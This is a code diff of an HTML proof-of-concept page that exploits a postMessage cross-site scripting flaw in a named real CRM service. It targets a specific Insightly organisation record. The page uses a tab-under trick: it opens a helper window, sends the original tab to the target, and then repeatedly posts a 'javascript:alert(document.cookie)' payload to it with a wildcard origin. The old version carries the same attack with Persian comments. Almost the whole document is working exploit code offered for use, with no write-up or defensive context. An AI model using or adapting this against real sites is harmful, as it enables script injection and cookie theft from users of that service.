@@ -1,50 +1,75 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>PoC Tester</title>
+  <title>PostMessage XSS - Tab-Under Fixed</title>
   <style>
-    body { display:flex; justify-content:center; align-items:center; height:100vh; margin:0; background:#0d1117; color:#c9d1d9; font-family:monospace; }
-    button { padding:14px 28px; font-size:16px; cursor:pointer; background:#238636; color:#fff; border:none; border-radius:6px; }
-    #log { position:fixed; bottom:20px; left:20px; right:20px; max-height:120px; overflow:auto; background:#161b22; padding:10px; font-size:13px; border-radius:6px; }
+    body { font-family: Arial; text-align: center; margin-top: 100px; background: #f4f4f4; }
+    button { padding: 15px 30px; font-size: 18px; background: #e74c3c; color: #fff; border: none; border-radius: 6px; cursor: pointer; }
+    #log { margin-top: 20px; background: #fff; border: 1px solid #ccc; padding: 10px; width: 80%; margin: 20px auto; text-align: left; font-family: monospace; max-height: 200px; overflow: auto; }
   </style>
 </head>
 <body>
-  <button onclick="run()">🚀 اجرای PoC</button>
+  <h1>🚨 PostMessage XSS (Tab-Under - Fixed)</h1>
+  <p>Click the button – alert should appear on insightly.com</p>
+  <button id="exploitBtn">Run Exploit</button>
   <div id="log"></div>
 
   <script>
-    const TARGET = "https://crm.na1.insightly.com/list/Organisation/ALL?blade=/details/organisation/174120691";
+    const TARGET_URL = "https://crm.na1.insightly.com/list/Organisation/ALL?blade=/details/organisation/174120691";
     const PAYLOAD = "javascript:alert(document.cookie)";
 
     function log(msg) {
-      const d = document.getElementById('log');
-      d.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+      const logDiv = document.getElementById('log');
+      const time = new Date().toLocaleTimeString();
+      logDiv.innerHTML += `[${time}] ${msg}<br>`;
+      console.log(msg);
     }
 
-    function run() {
-      // ۱. باز کردن پنجره کمکی (حتماً باید اولین خط داخل onclick باشد)
-      const helper = window.open('', '_blank', 'width=1,height=1,left=-9999,top=-9999');
-      if (!helper) { log('❌ پاپ‌آپ بلاک شد. لطفاً Allow Popups را فعال کنید.'); return; }
-      log('✅ Helper باز شد.');
+    function sendMessages(targetWindow) {
+      let count = 0;
+      const maxAttempts = 15;
+      const interval = setInterval(() => {
+        try {
+          targetWindow.postMessage({ type: "mailchimp", url: PAYLOAD }, "*");
+          log(`✅ Payload sent (${count+1}/${maxAttempts})`);
+        } catch (err) {
+          log(`❌ Error: ${err.message}`);
+        }
+        count++;
+        if (count >= maxAttempts) clearInterval(interval);
+      }, 1500); // هر ۱.۵ ثانیه یکبار
+    }
 
-      // ۲. تزریق اسکریپت ارسال پیام به Helper
-      helper.document.write(`
-        <script>
-          setTimeout(() => {
-            for (let i = 0; i < 10; i++) {
-              setTimeout(() => {
-                window.opener?.postMessage({ url: "${PAYLOAD}" }, "*");
-              }, i * 800);
-            }
-          }, 2500); // صبر تا لود کامل صفحه هدف
-        <\/script>
-      `);
-      helper.document.close();
-
-      // ۳. ریدایرکت تب اصلی به هدف
-      log('🔄 ریدایرکت به Target...');
-      location.href = TARGET;
+    if (window.opener) {
+      // Helper window
+      log("Helper: waiting for opener to load target...");
+      // تأخیر بیشتر برای اطمینان از بارگذاری کامل صفحه هدف در opener
+      setTimeout(() => {
+        if (window.opener && !window.opener.closed) {
+          log("Helper: sending payloads to opener...");
+          sendMessages(window.opener);
+          // بستن helper بعد از چند ثانیه
+          setTimeout(() => window.close(), 5000);
+        } else {
+          log("Helper: opener not available.");
+        }
+      }, 4000); // ۴ ثانیه صبر
+    } else {
+      // Main window
+      log("Main: ready. Click button to start tab-under.");
+      document.getElementById('exploitBtn').addEventListener('click', () => {
+        log("Main: opening helper window...");
+        const helper = window.open(location.href, "helperWindow");
+        if (!helper) {
+          log("ERROR: Popup blocked! Please allow popups for this site.");
+          alert("Please allow popups and try again.");
+          return;
+        }
+        log("Main: redirecting main tab to target...");
+        location.href = TARGET_URL;
+        // Main tab will now navigate away, helper takes over
+      });
     }
   </script>
 </body>
